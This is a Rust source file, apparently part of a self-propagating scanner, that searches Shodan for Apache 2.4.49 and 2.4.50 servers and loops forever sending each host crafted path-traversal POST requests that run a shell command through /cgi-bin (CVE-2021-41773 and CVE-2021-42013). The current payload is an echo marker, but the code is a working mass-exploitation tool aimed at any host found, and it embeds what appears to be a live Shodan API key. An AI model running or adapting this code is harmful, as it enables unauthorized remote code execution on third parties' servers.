mod http;
mod ssh;

use crate::shodan::Shodan;

use log::{info, warn};

use std::net::Ipv4Addr;

const PAYLOAD: &'static str = "echo 37714-1202-EVC | rev";


pub struct Exploit {
    query: String,
    request: fn(String, &'static str) -> String,
}

pub struct Propogate {
    shodan: Shodan,
    exploits: Vec<Exploit>,
}

impl Propogate {
    pub fn new() -> Propogate {
        Propogate {
            shodan: Shodan::new("7XRdrUMb9i2N6P6rqyXIM3PyDGBl6Wyg"),
            exploits: Vec::new(),
        }
    }

    pub fn add(&mut self, query: &str, request: fn(String, &'static str) -> String) {
        self.exploits.push(Exploit {
            query: query.to_string(),
            request,
        });
    }

    pub fn run(&mut self) -> ! {
        loop {
            for exploit in self.exploits.iter() {
                let mut page = 0;

                info!("searching for vulnerable {} servers", exploit.query);

                while let Some(search) = self.shodan.search(&exploit.query, page) {
                    info!("shodan searching {} hosts, page {}/{}", search.total, page, search.total / 100);

                    for host in search.hosts {
                        let ip = Ipv4Addr::from_bits(host.ip);

                        if let Err(err) = http::send(ip, (exploit.request)(ip.to_string(), PAYLOAD)) {
                            warn!("failed to send exploit to {}, {}", ip, err);
                        }
                    }

                    page += 1;
                }
            }
        }
    }
}

pub fn run() -> ! {
    let mut propogate = Propogate::new();

    // https://nvd.nist.gov/vuln/detail/CVE-2021-41773

    propogate.add("apache 2.4.49", |host, payload| [
        format!("POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1\r\n"),
        format!("Host: {}\r\n", host),
        format!("Content-Length: {}\r\n", 37 + payload.len()),
        format!("Content-Type: application/x-www-form-urlencoded\r\n"),
        format!("\r\n"),
        format!("echo Content-Type: text/plain; echo; {}\r\n", payload),
    ].concat());

    // https://nvd.nist.gov/vuln/detail/CVE-2021-42013

    propogate.add("apache 2.4.50", |host, payload| [
        format!("POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1\r\n"),
        format!("Host: {}\r\n", host),
        format!("Content-Length: {}\r\n", 37 + payload.len()),
        format!("Content-Type: application/x-www-form-urlencoded\r\n"),
        format!("\r\n"),
        format!("echo Content-Type: text/plain; echo; {}\r\n", payload),
    ].concat());

    // https://nvd.nist.gov/vuln/detail/cve-2024-23897

    propogate.run()
}


